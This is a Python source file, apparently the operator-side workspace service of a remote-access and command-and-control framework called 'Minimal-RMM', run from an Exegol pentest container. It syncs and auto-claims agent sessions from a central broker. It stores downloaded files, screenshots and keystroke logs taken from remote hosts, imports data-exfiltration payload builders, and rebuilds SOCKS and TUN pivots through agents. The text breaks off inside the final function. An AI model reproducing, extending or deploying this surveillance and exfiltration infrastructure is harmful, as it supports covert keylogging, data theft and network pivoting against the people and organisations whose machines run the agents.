#!/usr/bin/env python3
"""Per-operator workspace service for Minimal-RMM.

Run this service inside an Exegol container. It serves the existing WebUI on
loopback, persists transcripts and artifacts in a local SQLite database, and
relays operator actions and pivot task batches to the central RMM broker over
authenticated HTTP.
"""

from __future__ import annotations

from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import argparse
import base64
import hashlib
import hmac
import json
import os
from pathlib import Path
import re
import shutil
import sqlite3
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime
from typing import Any

from rmm_rclone import (
    RcloneConfigError,
    build_exfil_payload,
    build_plugin_exfil_job,
    get_rclone_default_profile,
    load_profiles,
    rclone_public_config,
)
from rmm_ai_skills import _load_all_skills_full, list_ai_skills
from rmm_asset_store import AssetError, AssetStore, decode_asset_content
from rmm_embeddings import EmbeddingStore, embedding_api
from rmm_plugin_releases import plugin_release_api
from rmm_plugin_sources import plugin_sources_api
from rmm_ui_state import UiStateError, normalize_ui_state
from workspace_pivot import WorkspacePivotManager


ROOT = Path(__file__).resolve().parent
WEB_DIR = ROOT / "web"
DEFAULT_BIND = "127.0.0.1"
DEFAULT_PORT = 8787
DEFAULT_DATA_DIR = Path(os.environ.get("RMM_WORKSPACE_DATA", "~/.minimal-rmm")).expanduser()
MAX_LOCAL_BODY = int(os.environ.get("RMM_WORKSPACE_MAX_BODY", str(32 * 1024 * 1024)))
SAFE_NAME_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._ -]{0,199}$")


def _safe_name(value: str, default: str = "artifact") -> str:
    """Reduce an agent supplied basename to a safe local artifact name."""
    name = os.path.basename(str(value or "").replace("\\", "/")).strip().strip(".")
    if not name or name in {".", ".."} or ".." in name:
        return default
    cleaned = "".join(char for char in name if char.isalnum() or char in "._- ")
    cleaned = cleaned.strip()[:200]
    return cleaned if SAFE_NAME_RE.fullmatch(cleaned) else default


def _safe_path(base: Path, name: str) -> Path:
    """Join a basename under a local workspace directory."""
    root = base.resolve()
    path = (root / name).resolve()
    if path != root and root not in path.parents:
        raise ValueError("artifact path escapes workspace storage")
    return path


def _session_prefix(session_id: str) -> str:
    """Return the stable twelve-character artifact prefix for a session."""
    return hashlib.sha256(str(session_id).encode("utf-8")).hexdigest()[:12]


class WorkspaceStore:
    """SQLite-backed workspace-local sessions, events, chats, and artifacts."""

    def __init__(self, data_dir: str | os.PathLike[str], workspace_id: str):
        self.data_dir = Path(data_dir).expanduser().resolve()
        self.workspace_id = workspace_id
        self.data_dir.mkdir(parents=True, exist_ok=True)
        try:
            os.chmod(self.data_dir, 0o700)
        except OSError:
            pass
        self.artifact_dir = self.data_dir / "artifacts"
        self.download_dir = self.artifact_dir / "downloads"
        self.screenshot_dir = self.artifact_dir / "screenshots"
        self.keylog_dir = self.artifact_dir / "keylogs"
        self.parts_dir = self.data_dir / "parts"
        for path in (self.download_dir, self.screenshot_dir, self.keylog_dir, self.parts_dir):
            path.mkdir(parents=True, exist_ok=True)
            try:
                os.chmod(path, 0o700)
            except OSError:
                pass
        self.assets = AssetStore(self.data_dir / "assets")
        self._lock = threading.RLock()
        self._db = sqlite3.connect(self.data_dir / "workspace.db", check_same_thread=False)
        self._db.row_factory = sqlite3.Row
        self._db.execute("PRAGMA journal_mode=WAL")
        self._db.execute("PRAGMA foreign_keys=ON")
        self._init_schema()
        self.embeddings = EmbeddingStore(self.data_dir / "workspace.db")
        try:
            os.chmod(self.data_dir / "workspace.db", 0o600)
        except OSError:
            pass

    @property
    def asset_store(self) -> AssetStore:
        """Return the persistent workspace asset store."""
        return self.assets

    def asset_list(self, kind: str | None = None) -> list[dict[str, Any]]:
        """List operator-managed assets stored in this workspace."""
        return self.assets.list(kind)

    def get_ui_state(self) -> dict[str, dict[str, str]] | None:
        """Load the persisted workspace WebUI state from the local database."""
        with self._lock:
            row = self._db.execute(
                "SELECT payload FROM ui_state WHERE namespace='workspace'"
            ).fetchone()
        if not row:
            return None
        try:
            payload = json.loads(row["payload"])
        except (TypeError, json.JSONDecodeError) as exc:
            raise UiStateError("stored UI state is invalid") from exc
        return normalize_ui_state(payload)

    def set_ui_state(self, payload: dict[str, Any]) -> dict[str, Any]:
        """Normalize and persist workspace WebUI state in SQLite."""
        normalized = normalize_ui_state(payload)
        encoded = json.dumps(normalized, ensure_ascii=False, separators=(",", ":"))
        updated_at = datetime.now().isoformat(timespec="seconds")
        with self._lock:
            self._db.execute(
                "INSERT INTO ui_state(namespace,payload,updated_at) VALUES('workspace',?,?) "
                "ON CONFLICT(namespace) DO UPDATE SET payload=excluded.payload,updated_at=excluded.updated_at",
                (encoded, updated_at),
            )
            self._db.commit()
        return {"state": normalized, "updated_at": updated_at}

    def rclone_profiles(self) -> dict[str, dict]:
        """Load enabled workspace rclone profile files, falling back to legacy config."""
        profiles: dict[str, dict] = {}
        for row in self.assets.list("rclone", include_disabled=False):
            try:
                payload = json.loads(self.assets.read("rclone", row["name"]))
            except (AssetError, json.JSONDecodeError):
                continue
            if not isinstance(payload, dict):
                continue
            if payload.get("type"):
                name = str(payload.get("name") or Path(row["name"]).stem).strip()
                if name:
                    profiles[name] = payload
                continue
            for name, profile in payload.items():
                if isinstance(profile, dict) and profile.get("type"):
                    profiles[str(name)] = profile
        if profiles:
            return profiles
        return load_profiles()

    def skill_directories(self) -> list[str]:
        """Return built-in skills followed by the workspace skill overlay."""
        builtin = str(ROOT / "ai-skills")
        return [builtin, str(self.assets.root / "skills")]

    def skill_overrides(self) -> dict[str, bool]:
        """Return explicit workspace skill enablement flags."""
        flags = self.assets.flags("skills")
        for name, enabled in list(flags.items()):
            if name.lower().endswith(".md"):
                flags.setdefault(Path(name).stem.lower(), enabled)
        return flags

    def list_skills(self) -> list[dict]:
        """Return built-in and uploaded skill metadata with workspace state."""
        return list_ai_skills(self.skill_directories(), self.skill_overrides())

    def selected_skill_documents(self, skill_ids: list[str] | None) -> list[dict]:
        """Return selected local skill documents for forwarding to the central AI loop."""
        available = {
            row["id"]: row
            for row in _load_all_skills_full(self.skill_directories())
            if self.skill_overrides().get(row["id"], True)
        }
        if skill_ids is None:
            selected = [
                row for row in available.values()
                if row.get("default") or row.get("always")
            ]
        else:
            selected = []
            ids = {str(value or "").strip().lower() for value in skill_ids}
            for row in available.values():
                if row["id"] in ids or row.get("always"):
                    selected.append(row)
        return selected

    def _init_schema(self) -> None:
        """Create the local workspace schema on first start."""
        with self._lock:
            self._db.executescript(
                """
                CREATE TABLE IF NOT EXISTS metadata (
                    key TEXT PRIMARY KEY,
                    value TEXT NOT NULL
                );
                CREATE TABLE IF NOT EXISTS ui_state (
                    namespace TEXT PRIMARY KEY,
                    payload TEXT NOT NULL,
                    updated_at TEXT NOT NULL
                );
                CREATE TABLE IF NOT EXISTS sessions (
                    session_id TEXT PRIMARY KEY,
                    payload TEXT NOT NULL,
                    active INTEGER NOT NULL DEFAULT 1,
                    updated_at TEXT NOT NULL,
                    ended_at TEXT
                );
                CREATE TABLE IF NOT EXISTS events (
                    session_id TEXT NOT NULL,
                    event_id INTEGER NOT NULL,
                    payload TEXT NOT NULL,
                    PRIMARY KEY (session_id, event_id)
                );
                CREATE TABLE IF NOT EXISTS downloads (
                    artifact TEXT PRIMARY KEY,
                    session_id TEXT NOT NULL,
                    remote_path TEXT NOT NULL,
                    size INTEGER NOT NULL,
                    received_at TEXT NOT NULL
                );
                CREATE TABLE IF NOT EXISTS ai_chats (
                    session_id TEXT PRIMARY KEY,
                    payload TEXT NOT NULL
                );
                """
            )
            self._db.commit()

    def close(self) -> None:
        """Close the local SQLite connection."""
        with self._lock:
            self.embeddings.close()
            self._db.close()

    def get_cursor(self) -> int:
        """Return the last central workspace event cursor applied locally."""
        with self._lock:
            row = self._db.execute("SELECT value FROM metadata WHERE key='event_cursor'").fetchone()
        try:
            return max(0, int(row[0])) if row else 0
        except (TypeError, ValueError):
            return 0

    def set_cursor(self, cursor: int) -> None:
        """Persist the central workspace event cursor atomically."""
        with self._lock:
            self._db.execute(
                "INSERT INTO metadata(key,value) VALUES('event_cursor',?) "
                "ON CONFLICT(key) DO UPDATE SET value=excluded.value",
                (str(max(0, int(cursor))),),
            )
            self._db.commit()

    def sync_sessions(self, records: list[dict[str, Any]]) -> None:
        """Upsert active central sessions and archive rows absent from a fresh sync."""
        now = datetime.now().isoformat()
        seen: set[str] = set()
        with self._lock:
            for record in records:
                if not isinstance(record, dict) or not record.get("id"):
                    continue
                session_id = str(record["id"])
                seen.add(session_id)
                self._db.execute(
                    "INSERT INTO sessions(session_id,payload,active,updated_at,ended_at) "
                    "VALUES(?,?,1,?,NULL) ON CONFLICT(session_id) DO UPDATE SET "
                    "payload=excluded.payload,active=1,updated_at=excluded.updated_at,ended_at=NULL",
                    (session_id, json.dumps(record, ensure_ascii=False), now),
                )
            if seen:
                placeholders = ",".join("?" for _ in seen)
                self._db.execute(
                    f"UPDATE sessions SET active=0,ended_at=COALESCE(ended_at,?) "
                    f"WHERE active=1 AND session_id NOT IN ({placeholders})",
                    (now, *sorted(seen)),
                )
            else:
                self._db.execute(
                    "UPDATE sessions SET active=0,ended_at=COALESCE(ended_at,?) WHERE active=1",
                    (now,),
                )
            self._db.commit()

    @staticmethod
    def _decode_session(row: sqlite3.Row | None) -> dict[str, Any] | None:
        """Decode one session row into the API representation."""
        if not row:
            return None
        try:
            payload = json.loads(row["payload"])
        except (TypeError, json.JSONDecodeError):
            payload = {"id": row["session_id"]}
        if not isinstance(payload, dict):
            payload = {"id": row["session_id"]}
        return payload

    def list_sessions(self) -> list[dict[str, Any]]:
        """Return active workspace sessions in central order."""
        with self._lock:
            rows = self._db.execute(
                "SELECT payload FROM sessions WHERE active=1 ORDER BY updated_at DESC"
            ).fetchall()
        result = []
        for row in rows:
            try:
                payload = json.loads(row["payload"])
            except (TypeError, json.JSONDecodeError):
                continue
            if isinstance(payload, dict):
                result.append(payload)
        return result

    def resolve_session(self, session_ref: str, active_only: bool = False) -> dict[str, Any] | None:
        """Resolve a full session ID or unique prefix from local state."""
        ref = str(session_ref or "").strip()
        if not ref:
            return None
        with self._lock:
            query = "SELECT * FROM sessions WHERE session_id=?"
            params: tuple[Any, ...] = (ref,)
            if active_only:
                query += " AND active=1"
            row = self._db.execute(query, params).fetchone()
            if row:
                return self._decode_session(row)
            query = "SELECT * FROM sessions WHERE session_id LIKE ?"
            params = (ref + "%",)
            if active_only:
                query += " AND active=1"
            rows = self._db.execute(query, params).fetchall()
        if len(rows) != 1:
            return None
        return self._decode_session(rows[0])

    def apply_event(self, session_id: str, event: dict[str, Any]) -> dict[str, Any] | None:
        """Persist one central event and materialize any workspace artifact payload."""
        if not isinstance(event, dict):
            return None
        payload = event.get("workspace_payload")
        local_event = dict(event)
        local_event.pop("workspace_payload", None)
        local_event["artifact"] = None
        local_event["artifact_url"] = None

        if isinstance(payload, dict):
            kind = payload.get("kind")
            if kind == "file_upload":
                materialized = self._apply_file_upload(session_id, payload)
                if materialized is None:
                    return None
                local_event["artifact"] = materialized
                local_event["artifact_url"] = f"/api/v1/artifacts/downloads/{urllib.parse.quote(materialized)}"
            elif kind == "screenshot":
                materialized = self._apply_screenshot(session_id, payload)
                if materialized:
                    local_event["artifact"] = materialized
                    local_event["artifact_url"] = f"/api/v1/artifacts/screenshots/{urllib.parse.quote(materialized)}"
            elif kind == "keylog":
                materialized = self._apply_keylog(session_id, payload)
                if materialized:
                    local_event["artifact"] = materialized
                    local_event["artifact_url"] = f"/api/v1/artifacts/keylogs/{urllib.parse.quote(materialized)}"

        try:
            event_id = int(local_event.get("id") or 0)
        except (TypeError, ValueError):
            return None
        if event_id <= 0:
            return None
        with self._lock:
            self._db.execute(
                "INSERT OR IGNORE INTO events(session_id,event_id,payload) VALUES(?,?,?)",
                (session_id, event_id, json.dumps(local_event, ensure_ascii=False)),
            )
            self._db.commit()
        return local_event

    def _apply_file_upload(self, session_id: str, payload: dict[str, Any]) -> str | None:
        """Write one file upload chunk and return its final local basename."""
        data = payload.get("data")
        if not isinstance(data, dict):
            return None
        raw_name = _safe_name(data.get("filename"), "download")
        remote_path = str(payload.get("remote_path") or data.get("remote_path") or raw_name)
        prefix = _session_prefix(session_id)
        content_b64 = str(data.get("content") or "")
        try:
            content = base64.b64decode(content_b64, validate=True)
        except (ValueError, TypeError):
            return None
        if "offset" not in data:
            filename = f"{prefix}_{raw_name}"
            final_path = _safe_path(self.download_dir, filename)
            final_path.write_bytes(content)
            self._index_download(filename, session_id, remote_path, final_path.stat().st_size)
            return filename

        upload_id = re.sub(r"[^A-Za-z0-9_-]", "", str(data.get("upload_id") or "default"))[:64] or "default"
        staging = _safe_path(self.parts_dir, f"{prefix}_{upload_id}.part")
        try:
            offset = max(0, int(data.get("offset", 0)))
        except (TypeError, ValueError):
            return None
        if offset == 0 or not staging.exists():
            mode = "wb"
        else:
            mode = "r+b"
        with staging.open(mode) as handle:
            if mode == "r+b":
                handle.seek(offset)
            handle.write(content)
        if not data.get("eof"):
            return None
        filename = f"{prefix}_{raw_name}"
        final_path = _safe_path(self.download_dir, filename)
        os.replace(staging, final_path)
        self._index_download(filename, session_id, remote_path, final_path.stat().st_size)
        return filename

    def _apply_screenshot(self, session_id: str, payload: dict[str, Any]) -> str | None:
        """Decode a screenshot payload into the workspace screenshot directory."""
        try:
            content = base64.b64decode(str(payload.get("content_b64") or ""), validate=True)
        except (ValueError, TypeError):
            return None
        raw_name = _safe_name(payload.get("filename"), f"{datetime.now():%Y%m%d_%H%M%S}.png")
        prefix = _session_prefix(session_id)
        filename = raw_name if raw_name.startswith(f"{prefix}_") else f"{prefix}_{raw_name}"
        if not filename.lower().endswith(".png"):
            filename += ".png"
        path = _safe_path(self.screenshot_dir, filename)
        path.write_bytes(content)
        return filename

    def _apply_keylog(self, session_id: str, payload: dict[str, Any]) -> str | None:
        """Write one keylog payload into the workspace keylog directory."""
        raw_name = _safe_name(payload.get("filename"), f"{datetime.now():%Y%m%d_%H%M%S}.log")
        prefix = _session_prefix(session_id)
        filename = raw_name if raw_name.startswith(f"{prefix}_") else f"{prefix}_{raw_name}"
        if not filename.lower().endswith(".log"):
            filename += ".log"
        path = _safe_path(self.keylog_dir, filename)
        path.write_text(str(payload.get("content") or ""), encoding="utf-8")
        return filename

    def _index_download(self, filename: str, session_id: str, remote_path: str, size: int) -> None:
        """Update the local download index after a file reaches EOF."""
        received_at = datetime.now().isoformat()
        with self._lock:
            self._db.execute(
                "INSERT INTO downloads(artifact,session_id,remote_path,size,received_at) VALUES(?,?,?,?,?) "
                "ON CONFLICT(artifact) DO UPDATE SET remote_path=excluded.remote_path,size=excluded.size,received_at=excluded.received_at",
                (filename, session_id, remote_path, int(size), received_at),
            )
            self._db.commit()

    def get_events(self, session_ref: str, since: int = 0, limit: int = 100) -> list[dict[str, Any]] | None:
        """Read local transcript events for a live or archived session."""
        session = self.resolve_session(session_ref)
        if not session:
            return None
        sid = str(session["id"])
        with self._lock:
            rows = self._db.execute(
                "SELECT payload FROM events WHERE session_id=? AND event_id>? ORDER BY event_id LIMIT ?",
                (sid, max(0, int(since)), max(1, min(1000, int(limit)))),
            ).fetchall()
        result = []
        for row in rows:
            try:
                event = json.loads(row["payload"])
            except (TypeError, json.JSONDecodeError):
                continue
            if isinstance(event, dict):
                result.append(event)
        return result

    def list_history(self) -> list[dict[str, Any]]:
        """Return locally archived session metadata."""
        with self._lock:
            rows = self._db.execute(
                "SELECT session_id,payload,active,ended_at,updated_at "
                "FROM sessions WHERE active=0 ORDER BY COALESCE(ended_at,updated_at) DESC"
            ).fetchall()
        result = []
        for row in rows:
            payload = self._decode_session(row) or {"id": row["session_id"]}
            payload.update(
                {
                    "session_id": row["session_id"],
                    "active": False,
                    "ended_at": row["ended_at"],
                    "updated_at": row["updated_at"],
                }
            )
            result.append(payload)
        return result

    def history_meta(self, session_ref: str) -> dict[str, Any] | None:
        """Return a live or archived local session record."""
        session = self.resolve_session(session_ref)
        if not session:
            return None
        with self._lock:
            row = self._db.execute(
                "SELECT active,ended_at,updated_at FROM sessions WHERE session_id=?",
                (session["id"],),
            ).fetchone()
        session = dict(session)
        session.update(
            {
                "session_id": session["id"],
                "active": bool(row["active"]) if row else False,
                "ended_at": row["ended_at"] if row else None,
                "updated_at": row["updated_at"] if row else None,
            }
        )
        return session

    def list_downloads(self, session_ref: str) -> list[dict[str, Any]] | None:
        """Return locally indexed downloaded files for one session."""
        session = self.resolve_session(session_ref)
        if not session:
            return None
        with self._lock:
            rows = self._db.execute(
                "SELECT artifact,remote_path,size,received_at FROM downloads "
                "WHERE session_id=? ORDER BY received_at DESC",
                (session["id"],),
            ).fetchall()
        return [
            {
                "artifact": row["artifact"],
                "remote_path": row["remote_path"],
                "size": row["size"],
                "received_at": row["received_at"],
                "artifact_url": f"/api/v1/artifacts/downloads/{urllib.parse.quote(row['artifact'])}",
            }
            for row in rows
        ]

    def list_artifacts(self, kind: str) -> list[dict[str, Any]]:
        """List workspace downloads or screenshots with their agent identity."""
        if kind not in {"downloads", "screenshots"}:
            raise ValueError("artifact kind must be downloads or screenshots")

        with self._lock:
            session_rows = self._db.execute(
                "SELECT session_id,payload,active FROM sessions"
            ).fetchall()
            download_rows = self._db.execute(
                "SELECT artifact,remote_path,received_at FROM downloads"
            ).fetchall()
        sessions: dict[str, dict[str, Any]] = {}
        for row in session_rows:
            try:
                payload = json.loads(row["payload"])
            except (TypeError, json.JSONDecodeError):
                payload = {}
            if not isinstance(payload, dict):
                payload = {}
            payload.update({"session_id": row["session_id"], "active": bool(row["active"])})
            sessions[_session_prefix(row["session_id"])] = payload
        downloads = {row["artifact"]: row for row in download_rows}

        directory = self.download_dir if kind == "downloads" else self.screenshot_dir
        try:
            paths = sorted(
                path for path in directory.iterdir()
                if path.is_file() and not path.name.endswith(".part")
            )
        except OSError:
            return []
        rows: list[dict[str, Any]] = []
        for path in paths:
            prefix = path.name.split("_", 1)[0]
            session = sessions.get(prefix, {})
            indexed = downloads.get(path.name) if kind == "downloads" else None
            try:
                stat = path.stat()
                size = stat.st_size
                received_at = datetime.fromtimestamp(stat.st_mtime).isoformat()
            except OSError:
                size = 0
                received_at = datetime.now().isoformat()
            session_id = str(session.get("session_id") or "") or None
            hostname = str(session.get("hostname") or "?")
            username = str(session.get("username") or "?")
            rows.append(
                {
                    "kind": kind,
                    "artifact": path.name,
                    "remote_path": str(indexed["remote_path"] or "") if indexed else "",
                    "size": size,
                    "received_at": str(indexed["received_at"] or received_at) if indexed else received_at,
                    "artifact_url": f"/api/v1/artifacts/{kind}/{urllib.parse.quote(path.name)}",
                    "session_id": session_id,
                    "hostname": hostname,
                    "username": username,
                    "agent_label": f"{username}@{hostname}",
                    "active": bool(session.get("active", False)),
                }
            )
        rows.sort(key=lambda row: row.get("received_at") or "", reverse=True)
        return rows

    def artifact_path(self, kind: str, filename: str) -> Path | None:
        """Resolve a local artifact path for the authenticated workspace API."""
        directories = {
            "downloads": self.download_dir,
            "screenshots": self.screenshot_dir,
            "keylogs": self.keylog_dir,
        }
        directory = directories.get(kind)
        if not directory:
            return None
        safe = _safe_name(urllib.parse.unquote(filename), "")
        if not safe:
            return None
        path = _safe_path(directory, safe)
        return path if path.is_file() else None

    def get_ai_chat(self, session_ref: str) -> tuple[str | None, list[dict[str, Any]] | None]:
        """Load local AI chat messages for a live or archived session."""
        session = self.resolve_session(session_ref)
        if not session:
            return None, None
        with self._lock:
            row = self._db.execute(
                "SELECT payload FROM ai_chats WHERE session_id=?", (session["id"],)
            ).fetchone()
        if not row:
            return session["id"], []
        try:
            messages = json.loads(row["payload"])
        except (TypeError, json.JSONDecodeError):
            messages = []
        return session["id"], messages if isinstance(messages, list) else []

    def save_ai_chat(self, session_ref: str, messages: list[dict[str, Any]]) -> bool:
        """Persist normalized AI chat messages locally."""
        session = self.resolve_session(session_ref)
        if not session or not isinstance(messages, list):
            return False
        normalized = []
        for message in messages[-500:]:
            if not isinstance(message, dict):
                continue
            if message.get("role") not in {"user", "assistant"} or not isinstance(message.get("content"), str):
                continue
            normalized.append({"role": message["role"], "content": message["content"]})
        with self._lock:
            self._db.execute(
                "INSERT INTO ai_chats(session_id,payload) VALUES(?,?) "
                "ON CONFLICT(session_id) DO UPDATE SET payload=excluded.payload",
                (session["id"], json.dumps(normalized, ensure_ascii=False)),
            )
            self._db.commit()
        return True

    def clear_ai_chat(self, session_ref: str) -> bool:
        """Delete local AI chat messages for one session."""
        session = self.resolve_session(session_ref)
        if not session:
            return False
        with self._lock:
            self._db.execute("DELETE FROM ai_chats WHERE session_id=?", (session["id"],))
            self._db.commit()
        return True

    def delete_history(self, session_ref: str) -> tuple[bool, str | None, str | None]:
        """Delete an archived local session and its workspace artifacts."""
        session = self.resolve_session(session_ref)
        if not session:
            return False, None, "history_not_found"
        sid = session["id"]
        with self._lock:
            row = self._db.execute("SELECT active FROM sessions WHERE session_id=?", (sid,)).fetchone()
            if not row:
                return False, None, "history_not_found"
            if row["active"]:
                return False, None, "session_still_active"
            artifact_rows = self._db.execute(
                "SELECT artifact FROM downloads WHERE session_id=?", (sid,)
            ).fetchall()
            self._db.execute("DELETE FROM events WHERE session_id=?", (sid,))
            self._db.execute("DELETE FROM downloads WHERE session_id=?", (sid,))
            self._db.execute("DELETE FROM ai_chats WHERE session_id=?", (sid,))
            self._db.execute("DELETE FROM sessions WHERE session_id=?", (sid,))
            self._db.commit()
        prefix = _session_prefix(sid)
        for directory in (self.download_dir, self.screenshot_dir, self.keylog_dir, self.parts_dir):
            for path in directory.glob(f"{prefix}_*"):
                try:
                    path.unlink()
                except OSError:
                    pass
        for row in artifact_rows:
            path = self.artifact_path("downloads", row["artifact"])
            if path:
                try:
                    path.unlink()
                except OSError:
                    pass
        return True, sid, None

    def clear_history(self) -> tuple[int, list[dict[str, str]]]:
        """Delete all archived local session rows."""
        rows = self.list_history()
        deleted = 0
        errors = []
        for row in rows:
            ok, sid, error = self.delete_history(row.get("session_id") or row.get("id"))
            if ok:
                deleted += 1
            else:
                errors.append({"session_id": sid or row.get("session_id", ""), "error": error or "delete_failed"})
        return deleted, errors


class WorkspaceUpstream:
    """HTTP client for authenticated central workspace broker requests."""

    def __init__(self, base_url: str, workspace_id: str, workspace_token: str):
        self.base_url = base_url.rstrip("/")
        self.workspace_id = workspace_id
        self.workspace_token = workspace_token

    def request(
        self,
        method: str,
        path: str,
        body: dict[str, Any] | None = None,
        timeout: float = 30,
    ) -> tuple[int, Any, str]:
        """Send one JSON or binary request to the central broker."""
        data = None
        headers = {
            "Accept": "application/json",
            "X-RMM-Workspace": self.workspace_id,
            "X-RMM-Workspace-Token": self.workspace_token,
        }
        if body is not None:
            data = json.dumps(body, ensure_ascii=False).encode("utf-8")
            headers["Content-Type"] = "application/json"
        request = urllib.request.Request(
            f"{self.base_url}{path}", data=data, headers=headers, method=method,
        )
        try:
            with urllib.request.urlopen(request, timeout=timeout) as response:
                content_type = response.headers.get_content_type()
                raw = response.read()
                if content_type == "application/json":
                    try:
                        return response.status, json.loads(raw.decode(errors="replace")), content_type
                    except json.JSONDecodeError:
                        return response.status, {"error": "invalid_upstream_json"}, content_type
                return response.status, raw, content_type
        except urllib.error.HTTPError as exc:
            raw = exc.read()
            try:
                payload = json.loads(raw.decode(errors="replace")) if raw else {}
            except json.JSONDecodeError:
                payload = {"error": raw.decode(errors="replace") or str(exc.reason)}
            return exc.code, payload, "application/json"
        except (urllib.error.URLError, TimeoutError, OSError) as exc:
            return 0, {"error": "upstream_unreachable", "detail": str(exc)}, "application/json"


class WorkspaceService:
    """Coordinate local persistence, central synchronization, and local pivots."""

    def __init__(
        self,
        central_url: str,
        workspace_id: str,
        workspace_token: str,
        data_dir: str | os.PathLike[str] = DEFAULT_DATA_DIR,
        bind: str = DEFAULT_BIND,
        port: int = DEFAULT_PORT,
        local_token: str = "",
        tun_helper: str = "",
        auto_claim: bool = False,
        poll_interval: float = 1.0,
    ):
        self.workspace_id = workspace_id
        self.local_token = local_token.strip()
        self.bind = bind
        self.port = int(port)
        self.auto_claim = bool(auto_claim)
        self.poll_interval = max(0.2, float(poll_interval))
        self.store = WorkspaceStore(data_dir, workspace_id)
        self.upstream = WorkspaceUpstream(central_url, workspace_id, workspace_token)
        helper_path = tun_helper.strip() or os.environ.get("RMM_WORKSPACE_TUN_HELPER", "tools/rmm-tun")
        self.pivots = WorkspacePivotManager(
            helper_path,
            self._submit_pivot_tasks,
            self._fetch_pivot_responses,
            self.log,
        )
        self._running = True
        self._sync_thread = threading.Thread(target=self._sync_loop, name="workspace-sync", daemon=True)
        self.http_server: ThreadingHTTPServer | None = None

    def log(self, message: str, level: str = "INFO") -> None:
        """Write workspace service lifecycle messages to stdout."""
        print(f"[{level}] {message}", flush=True)

    def _submit_pivot_tasks(self, session_id: str, channel: str, tasks: list[dict[str, Any]]) -> bool:
        """Forward one local pivot task batch to the central broker."""
        status, _payload, _content_type = self.upstream.request(
            "POST", f"/api/v1/workspace/sessions/{urllib.parse.quote(session_id)}/{channel}/tasks", {"tasks": tasks}
        )
        return status == 200

    def _fetch_pivot_responses(self, session_id: str, channel: str) -> list[dict[str, Any]]:
        """Fetch raw agent responses for one local pivot channel."""
        status, payload, _content_type = self.upstream.request(
            "GET", f"/api/v1/workspace/sessions/{urllib.parse.quote(session_id)}/{channel}/responses"
        )
        if status != 200 or not isinstance(payload, dict):
            return []
        responses = payload.get("responses")
        return responses if isinstance(responses, list) else []

    def _sync_plugin_asset(self, row: dict[str, Any] | None, *, removed: bool = False) -> bool:
        """Publish one workspace plugin artifact to the central runtime cache."""
        if not isinstance(row, dict) or not row.get("name"):
            return False
        payload: dict[str, Any] = {
            "name": row["name"],
            "enabled": bool(row.get("enabled", True)) and not removed,
            "sha256": row.get("sha256"),
        }
        if not removed:
            try:
                payload["content_b64"] = base64.b64encode(
                    self.store.asset_store.read("plugins", row["name"], enabled_only=False)
                ).decode("ascii")
            except AssetError:
                return False
        status, _response, _content_type = self.upstream.request(
            "POST", "/api/v1/workspace/assets/plugins", payload
        )
        return status == 200

    def _sync_workspace_plugins(self) -> None:
        """Republish persistent workspace plugins after a central restart."""
        for row in self.store.asset_list("plugins"):
            self._sync_plugin_asset(row)

    def _resolve_local_session_id(self, ref: str) -> str | None:
        """Resolve an API session reference using workspace-local state."""
        session = self.store.resolve_session(ref, active_only=True)
        return str(session["id"]) if session else None

    def sync_once(self) -> None:
        """Synchronize sessions, events, and central pivot state once."""
        if self.auto_claim:
            status, payload, _ = self.upstream.request("GET", "/api/v1/workspace/candidates")
            if status == 200 and isinstance(payload, dict):
                for candidate in payload.get("sessions", []):
                    session_id = candidate.get("id") if isinstance(candidate, dict) else None
                    if session_id:
                        self.upstream.request("POST", "/api/v1/workspace/claims", {"session_id": session_id})

        status, payload, _ = self.upstream.request("GET", "/api/v1/workspace/sessions")
        if status != 200 or not isinstance(payload, dict):
            return
        records = payload.get("sessions")
        if not isinstance(records, list):
            return
        self.store.sync_sessions(records)

        cursor = self.store.get_cursor()
        status, payload, _ = self.upstream.request(
            "GET", f"/api/v1/workspace/events?since={cursor}&limit=1000"
        )
        if status == 200 and isinstance(payload, dict):
            if payload.get("reset_required"):
                self.log("Central workspace event queue overflowed; local history is incomplete", "WARNING")
            for envelope in payload.get("events", []):
                if not isinstance(envelope, dict):
                    continue
                event = envelope.get("event")
                session_id = str(envelope.get("session_id") or "")
                if session_id and isinstance(event, dict):
                    self.store.apply_event(session_id, event)
                try:
                    cursor = max(cursor, int(envelope.get("cursor", cursor)))
                except (TypeError, ValueError):
                    pass
            if cursor != self.store.get_cursor():
                self.store.set_cursor(cursor)

        self._sync_pivot_state()

    def _sync_pivot_state(self) -> None:
        """Recreate local listeners after a workspace service restart."""
        status, payload, _ = self.upstream.request("GET", "/api/v1/socks")
        if status == 200 and isinstance(payload, dict):
            active = {str(row.get("session_id")): row for row in payload.get("relays", []) if isinstance(row, dict)}
            for row in self.pivots.list_socks_status():
                session_id = str(row.get("session_id") or "")
                if session_id and session_id not in active:
                    self.pivots.stop_socks(session_id)
            for session_id, row in active.items():
                if not self.pivots.socks_active(session_id):
                    try:
                        self.pivots.start_socks(
                            session_id,
                            port=int(row.get("port") or 1080),
                            bind_host=str(row.get("bind_host") or "127.0.0.1"),
                        )
                    except Exception as exc:
                        self.log(f"Cannot restore local SOCKS for {session_id[:8]}: {exc}", "WARNING")

        status, payload, _ = self.upstream.request("GET", "/api/v1/tun")
        if status == 200 and isinstance(payload, dict):
            active = {str(row.get("session_id")): row for row in payload.get("relays", []) if isinstance(row, dict)}
            for row in self.pivots.list_tun_status():
                session_id = str(row.get("session_id") or "")
                if session_id and session_id not in active:
                    self.pivots.stop_tun(session_id)
            for session_id, row in active.items():
                if not self.pivots.tun_active(session_id):
                    try:
                        self.pivots.start_tun(session_id, row)
                    except Exception as exc:
                        self.log(f"Cannot restore local TUN for {session_id[:8]}: {exc}", "WARNING")

    def _sync_loop(self) -> None:
        """Run periodic central synchronization until service shutdown."""
        while self._running:
            try:
                self.sync_once()
            except Exception as exc:
                self.log(f"Workspace sync failed: {exc}", "WARNING")
            time.sleep(self.poll_interval)

    def start(self) -> ThreadingHTTPServer:
        """Start the local HTTP service and its synchronization thread."""
        handler = type("BoundWorkspaceHandler", (WorkspaceRequestHandler,), {"service": self})
        self.http_server = ThreadingHTTPServer((self.bind, self.port), handler)
        self.port = int(self.http_server.server_address[1])
        try:
            self._sync_workspace_plugins()
        except Exception as exc:
            self.log(f"Workspace plugin sync failed: {exc}", "WARNING")
        self._sync_thread.start()
        self.log(f"Workspace {self.workspace_id} listening on {self.bind}:{self.port}", "SUCCESS")
        return self.http_server

    def serve_forever(self) -> None:
        """Start and run the local HTTP server until interrupted."""
        server = self.start()
        try:
            server.serve_forever()
